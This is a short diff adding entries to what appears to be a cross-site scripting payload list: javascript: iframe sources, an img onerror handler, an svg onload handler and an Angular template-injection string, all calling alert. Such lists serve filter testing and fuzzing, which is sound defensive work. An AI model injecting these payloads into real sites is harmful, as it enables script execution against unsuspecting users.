@@ -31,3 +31,7 @@
 <div onpointermove="alert(45)">MOVE HERE</div>
 <div onpointerout="alert(45)">MOVE HERE</div>
 <div onpointerup="alert(45)">MOVE HERE</div>
+<iframe src="javascript:alert('xss')">
+<img src=x onerror=alert('xss')>
+{{constructor.constructor('alert(1)')()}} 
+<svg onload=alert(1)>
